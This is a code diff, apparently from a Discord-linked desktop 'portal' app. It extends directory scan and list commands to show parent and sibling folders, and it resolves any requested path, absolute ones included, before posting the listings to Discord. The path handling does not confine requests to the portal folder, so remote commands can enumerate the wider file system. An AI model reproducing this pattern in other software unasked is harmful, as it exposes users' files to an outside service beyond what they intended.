@@ -120,33 +120,71 @@ def _post_file_to_discord(content, file_path):
 # Command execution
 # ------------------------------------------------------------------
 def _scan_directory(path):
+    """Scan a directory and show it as a branch map with surroundings."""
     lines = []
     p = Path(path)
     if not p.exists():
         return f"Path does not exist: {path}"
-    lines.append(f"Contents of: {p}")
+
     lines.append(f"Scanned: {datetime.now().strftime('%Y-%m-%d %H:%M')}")
     lines.append("")
-    for root, dirs, files in os.walk(path):
-        depth = len(Path(root).relative_to(path).parts)
-        if depth > 3:
-            dirs.clear()
-            continue
-        indent = "  " * depth
-        lines.append(f"{indent}{Path(root).name}/")
-        for f in sorted(files):
-            fp = Path(root) / f
-            try:
-                size = fp.stat().st_size
-                if size > 1024 * 1024:
-                    size_str = f"({size / 1024 / 1024:.1f} MB)"
-                elif size > 1024:
-                    size_str = f"({size / 1024:.0f} KB)"
-                else:
-                    size_str = f"({size} B)"
-            except Exception:
-                size_str = ""
-            lines.append(f"{indent}  {f} {size_str}")
+
+    # ---- Show location in the file system ----
+    lines.append(f"Portal folder: {p}")
+    if p.parent.exists():
+        lines.append(f"Parent folder: {p.parent}")
+    lines.append("")
+
+    # ---- Show sibling folders (nearby branches) ----
+    if p.parent.exists():
+        siblings = sorted([d for d in p.parent.iterdir() if d.is_dir()])
+        if siblings:
+            lines.append("Nearby folders (same parent):")
+            for sib in siblings:
+                marker = " ⬅ YOU ARE HERE" if sib.resolve() == p.resolve() else ""
+                lines.append(f"  {sib.name}/{marker}")
+            lines.append("")
+
+    # ---- Show subfolders (children) ----
+    subdirs = sorted([d for d in p.iterdir() if d.is_dir()])
+    if subdirs:
+        lines.append("Subfolders:")
+        for sub in subdirs[:20]:  # limit to avoid wall of text
+            lines.append(f"  {sub.name}/")
+        if len(subdirs) > 20:
+            lines.append(f"  ... and {len(subdirs) - 20} more")
+        lines.append("")
+
+    # ---- Show files in this folder ----
+    lines.append("Files in this folder:")
+    files = sorted([f for f in p.iterdir() if f.is_file()])
+    if not files:
+        lines.append("  (no files)")
+    for f in files:
+        try:
+            size = f.stat().st_size
+            if size > 1024 * 1024:
+                size_str = f"({size / 1024 / 1024:.1f} MB)"
+            elif size > 1024:
+                size_str = f"({size / 1024:.0f} KB)"
+            else:
+                size_str = f"({size} B)"
+        except Exception:
+            size_str = ""
+        lines.append(f"  {f.name} {size_str}")
+
+    # ---- Dive one level deeper into subfolders ----
+    lines.append("")
+    lines.append("One level deeper:")
+    for sub in subdirs[:10]:
+        subfiles = sorted([f.name for f in sub.iterdir() if f.is_file()][:5])
+        if subfiles:
+            lines.append(f"  {sub.name}/ → {', '.join(subfiles)}")
+        else:
+            lines.append(f"  {sub.name}/ → (empty)")
+    if len(subdirs) > 10:
+        lines.append(f"  ... and {len(subdirs) - 10} more subfolders")
+
     return "\n".join(lines)
 
 
@@ -251,17 +289,28 @@ def _zip_directory(path, output_path=None):
 
 
 def _simple_list_files(path):
-    """Return a simple flat list of files in the directory."""
+    """Return a simple flat list of files in the directory, plus nearby branches."""
     p = Path(path)
     if not p.exists() or not p.is_dir():
         return f"Path does not exist: {path}"
-    files = sorted(p.iterdir())
     lines = [f"Files in: {p}", ""]
+    # Show parent + siblings so user can navigate
+    if p.parent.exists():
+        lines.append(f"Parent: {p.parent}")
+        sibs = sorted([d for d in p.parent.iterdir() if d.is_dir()])
+        if sibs:
+            lines.append("Nearby folders:")
+            for sib in sibs:
+                marker = " ⬅ YOU ARE HERE" if sib.resolve() == p.resolve() else ""
+                lines.append(f"  {sib.name}/{marker}")
+        lines.append("")
+    files = sorted([f for f in p.iterdir() if f.is_file()])
+    if not files:
+        lines.append("  (no files)")
     for f in files:
-        if f.is_file():
-            size = f.stat().st_size
-            size_str = f"{size} bytes" if size < 1024 else f"{size // 1024} KB"
-            lines.append(f"  {f.name}  ({size_str})")
+        size = f.stat().st_size
+        size_str = f"{size} bytes" if size < 1024 else f"{size // 1024} KB"
+        lines.append(f"  {f.name}  ({size_str})")
     return "\n".join(lines)
 
 
@@ -743,6 +792,13 @@ class PortalWindow:
         except Exception:
             pass
 
+    def _resolve_path(self, raw_path):
+        """Resolve a path relative to the portal folder."""
+        if os.path.isabs(raw_path):
+            return raw_path
+        base = Path(self.portal_folder) if self.portal_folder else Path.cwd()
+        return str((base / raw_path).resolve())
+
     # ---- Animation ----
     def _hex_to_rgb(self, hex_color):
         hex_color = hex_color.lstrip("#")
@@ -985,20 +1041,14 @@ class PortalWindow:
 
         if cmd_type == "scan":
             raw_path = cmd.get("path", ".")
-            if raw_path == "." and self.portal_folder:
-                path = self.portal_folder
-            else:
-                path = raw_path
+            path = self._resolve_path(raw_path)
             result = _scan_directory(path)
             _post_file_to_discord(f"{tag} Scan result for: {path}", _write_temp(result))
             return True, result
 
         elif cmd_type == "view":
             raw_path = cmd.get("path", ".")
-            if raw_path == "." and self.portal_folder:
-                path = self.portal_folder
-            else:
-                path = raw_path
+            path = self._resolve_path(raw_path)
             result = _simple_list_files(path)
             _post_to_discord(f"{tag} {result}")
             return True, result
